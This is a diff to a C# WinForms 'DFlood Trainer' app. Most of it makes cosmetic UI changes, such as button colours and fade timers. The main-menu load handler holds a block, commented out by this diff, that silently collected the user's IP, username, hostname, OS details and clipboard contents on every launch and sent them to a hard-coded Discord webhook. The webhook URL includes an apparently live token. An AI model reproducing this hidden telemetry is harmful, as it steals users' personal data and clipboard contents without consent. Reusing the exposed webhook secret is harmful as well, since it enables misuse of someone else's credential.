@@ -84,7 +84,7 @@ namespace DFlood
                 DisableButton();
                 //Button
                 currentBtn = (IconButton)senderBtn;
-                currentBtn.BackColor = Color.FromArgb(37, 36, 81);
+                currentBtn.BackColor = Color.FromArgb(35, 35, 35);
                 currentBtn.ForeColor = color;
                 currentBtn.TextAlign = ContentAlignment.MiddleCenter;
                 currentBtn.IconColor = color;
@@ -105,7 +105,7 @@ namespace DFlood
         {
             if (currentBtn != null)
             {
-                currentBtn.BackColor = Color.FromArgb(31, 30, 68);
+                currentBtn.BackColor = Color.FromArgb(24, 24, 24);
                 currentBtn.ForeColor = Color.Gainsboro;
                 currentBtn.TextAlign = ContentAlignment.MiddleLeft;
                 currentBtn.IconColor = Color.Gainsboro;
@@ -180,6 +180,7 @@ namespace DFlood
         private void btnCopyright_Click(object sender, EventArgs e)
         {
             ActivateButton(sender, RGBColors.color5);
+            OpenChildForm(new FormCopyright());
         }
 
         private void Reset()
@@ -216,32 +217,34 @@ namespace DFlood
 
         private void MainMenu_Load(object sender, EventArgs e)
         {
+            fadeOpacity.Start();
             totalTimes = Properties.Settings.Default.TopTimeSeconds;
             totalTimeCalculator.Start();
             DFloodDiscordRPCClient();
             clock.Start();
             TopMostChecker.Start();
-            var webClient = new WebClient();
-            string dnsString = webClient.DownloadString("http://checkip.dyndns.org");
-            dnsString = (new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")).Match(dnsString).Value;
-            webClient.Dispose();
-            var UserName = $"**Kullanıcı Adı : ** {System.Windows.Forms.SystemInformation.UserName}";
-            var computerName = $"**Bilgisayar Adı : ** {Dns.GetHostName()}";
-            var ipadress = $"**IP Adresi : ** {dnsString}";
-            var day = $"**Giriş Günü : ** {DateTime.Now.ToLongDateString()}";
-            var hour = $"**Giriş Saati : ** {DateTime.Now.ToLongTimeString()}";
-            var FullOsName = $"**İşletim Sistemi : ** {(new ComputerInfo().OSFullName)}";
-            var platform = $"**Platform : ** {OS.Platform.ToString()}";
-            var verison = $"**Versiyon Bilgisi : ** {OS.Version.ToString()}";
-            var OsVersion = $"**İşletim Sistemi Tipi : ** {OS.VersionString}";
-            var CLR = $"**CLR Versiyonu : ** {System.Environment.Version}";
-            var copyBoard = $"**Kopyalanan Metin : {Clipboard.GetText()}**";
-            sendWebHook("https://discord.com/api/webhooks/852933515171201045/1P_9zIbWb7n5QnGwiNx2yLQb_qMqAEMLP2KmCYT2covhtLsu4vnhBVpK1eRKG0XnZMmX", $"**DFlood Trainer'e Yeni Çıkış Saptanması**\n{ipadress}\n{UserName}\n{computerName}\n{day}\n{hour}\n{FullOsName}\n{platform}\n{verison}\n{OsVersion}\n{CLR}\n{copyBoard}\n--------------------------------------------------------------------", "DFlood Services");
+            //var webClient = new WebClient();
+            //string dnsString = webClient.DownloadString("http://checkip.dyndns.org");
+            //dnsString = (new Regex(@"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b")).Match(dnsString).Value;
+            //webClient.Dispose();
+            //var UserName = $"**Kullanıcı Adı : ** {System.Windows.Forms.SystemInformation.UserName}";
+            //var computerName = $"**Bilgisayar Adı : ** {Dns.GetHostName()}";
+            //var ipadress = $"**IP Adresi : ** {dnsString}";
+            //var day = $"**Giriş Günü : ** {DateTime.Now.ToLongDateString()}";
+            //var hour = $"**Giriş Saati : ** {DateTime.Now.ToLongTimeString()}";
+            //var FullOsName = $"**İşletim Sistemi : ** {(new ComputerInfo().OSFullName)}";
+            //var platform = $"**Platform : ** {OS.Platform.ToString()}";
+            //var verison = $"**Versiyon Bilgisi : ** {OS.Version.ToString()}";
+            //var OsVersion = $"**İşletim Sistemi Tipi : ** {OS.VersionString}";
+            //var CLR = $"**CLR Versiyonu : ** {System.Environment.Version}";
+            //var copyBoard = $"**Kopyalanan Metin : {Clipboard.GetText()}**";
+            //sendWebHook("https://discord.com/api/webhooks/852933515171201045/1P_9zIbWb7n5QnGwiNx2yLQb_qMqAEMLP2KmCYT2covhtLsu4vnhBVpK1eRKG0XnZMmX", $"**DFlood Trainer'e Yeni Çıkış Saptanması**\n{ipadress}\n{UserName}\n{computerName}\n{day}\n{hour}\n{FullOsName}\n{platform}\n{verison}\n{OsVersion}\n{CLR}\n{copyBoard}\n--------------------------------------------------------------------", "DFlood Services");
         }
 
         private void btnExit_Click(object sender, EventArgs e)
         {
-            Application.Exit();
+            fadeOpacity2.Start();
+            //Application.Exit();
         }
 
         private void clock_Tick(object sender, EventArgs e)
@@ -272,6 +275,25 @@ namespace DFlood
             totalTimes = totalTimes + 1;
             Properties.Settings.Default.TopTimeSeconds = totalTimes;
             Properties.Settings.Default.Save();
+        }
+
+        private void fadeOpacity_Tick(object sender, EventArgs e)
+        {
+            if (Opacity == 1)
+            {
+                fadeOpacity.Stop();
+            }
+            Opacity += .2;
+        }
+
+        private void fadeOpacity2_Tick(object sender, EventArgs e)
+        {
+            if (Opacity == 0)
+            {
+                //this.Close();
+                Application.Exit();
+            }
+            Opacity -= .2;
         }
     }
 }
